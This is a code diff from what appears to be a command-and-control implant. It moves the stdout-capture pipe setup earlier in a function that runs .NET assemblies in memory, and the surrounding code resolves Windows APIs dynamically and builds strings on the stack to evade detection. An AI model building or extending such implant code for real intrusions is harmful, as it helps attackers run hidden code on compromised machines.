@@ -245,6 +245,37 @@ auto declfn starburst::cmd_execute_assembly(
     inst.kernel32.CloseHandle( pi.hThread );
     inst.kernel32.CloseHandle( h_read );
 
+    auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
+        inst.kernel32.GetProcAddress(
+            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
+
+#ifdef INCLUDE_CMD_POWERPICK
+    if ( !inst.powerpick.stdout_redirected ) {
+        SECURITY_ATTRIBUTES sa_pipe = {};
+        sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
+        sa_pipe.bInheritHandle = TRUE;
+        inst.kernel32.CreatePipe(
+            &inst.powerpick.pipe_read,
+            &inst.powerpick.pipe_write, &sa_pipe, 0 );
+        if ( pSetStdHandle ) {
+            pSetStdHandle( STD_OUTPUT_HANDLE, inst.powerpick.pipe_write );
+            pSetStdHandle( STD_ERROR_HANDLE, inst.powerpick.pipe_write );
+        }
+        inst.powerpick.stdout_redirected = true;
+    }
+    HANDLE h_pipe_read = inst.powerpick.pipe_read;
+#else
+    SECURITY_ATTRIBUTES sa_pipe = {};
+    sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
+    sa_pipe.bInheritHandle = TRUE;
+    HANDLE h_pipe_read = nullptr, h_pipe_write = nullptr;
+    inst.kernel32.CreatePipe( &h_pipe_read, &h_pipe_write, &sa_pipe, 0 );
+    if ( pSetStdHandle ) {
+        pSetStdHandle( STD_OUTPUT_HANDLE, h_pipe_write );
+        pSetStdHandle( STD_ERROR_HANDLE, h_pipe_write );
+    }
+#endif
+
     // local CLR hosting approach
     STK_MSCOREE(_n2);
     auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
@@ -383,9 +414,6 @@ auto declfn starburst::cmd_execute_assembly(
         inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysAllocString" ) ) );
     auto pSysFreeString = reinterpret_cast<fn_SysFreeString>(
         inst.kernel32.GetProcAddress( h_oleaut32, symbol<LPCSTR>( "SysFreeString" ) ) );
-    auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle, symbol<LPCSTR>( "SetStdHandle" ) ) );
 
     if ( !pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayDestroy ||
          !pSafeArrayCreateVector || !pSafeArrayPutElement || !pSysAllocString ) {
@@ -441,34 +469,6 @@ auto declfn starburst::cmd_execute_assembly(
         queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
         return;
     }
-
-    // Set up stdout capture via persistent pipe (shared with powerpick)
-#ifdef INCLUDE_CMD_POWERPICK
-    if ( !inst.powerpick.stdout_redirected ) {
-        SECURITY_ATTRIBUTES sa_pipe = {};
-        sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
-        sa_pipe.bInheritHandle = TRUE;
-        inst.kernel32.CreatePipe(
-            &inst.powerpick.pipe_read,
-            &inst.powerpick.pipe_write, &sa_pipe, 0 );
-        if ( pSetStdHandle ) {
-            pSetStdHandle( STD_OUTPUT_HANDLE, inst.powerpick.pipe_write );
-            pSetStdHandle( STD_ERROR_HANDLE, inst.powerpick.pipe_write );
-        }
-        inst.powerpick.stdout_redirected = true;
-    }
-    HANDLE h_pipe_read = inst.powerpick.pipe_read;
-#else
-    SECURITY_ATTRIBUTES sa_pipe = {};
-    sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
-    sa_pipe.bInheritHandle = TRUE;
-    HANDLE h_pipe_read = nullptr, h_pipe_write = nullptr;
-    inst.kernel32.CreatePipe( &h_pipe_read, &h_pipe_write, &sa_pipe, 0 );
-    if ( pSetStdHandle ) {
-        pSetStdHandle( STD_OUTPUT_HANDLE, h_pipe_write );
-        pSetStdHandle( STD_ERROR_HANDLE, h_pipe_write );
-    }
-#endif
 
     // Build args: split arguments string into string[] for Main(string[] args)
     SAFEARRAY* sa_string_args = nullptr;
